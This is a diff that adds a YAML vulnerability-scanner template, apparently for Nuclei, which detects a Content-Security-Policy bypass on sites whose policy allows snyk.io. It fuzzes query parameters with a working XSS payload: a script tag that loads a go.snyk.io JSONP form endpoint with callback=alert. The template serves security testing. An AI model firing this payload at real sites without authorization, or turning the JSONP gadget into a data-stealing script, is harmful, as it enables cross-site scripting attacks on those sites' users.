@@ -1,0 +1,55 @@
+id: snyk-go-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Snyk Go
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,snyk-go,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "snyk.io"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: snyk_go_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://go.snyk.io/index.php/form/getForm?munchkinId=677-THP-415&form=1461&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "snyk_go_csp_xss == true"
+# digest: 4a0a00473045022100b9f05725589e09e93a3ad74fd9e58cea2e017ae3fa1217a4c9863337d86e2dce02201bae37cd026c41f325be4a9cb93a7985d2c147a57fe39b7c4830a6ff8fad980f:922c64590222798bb761d5b6d8e72950
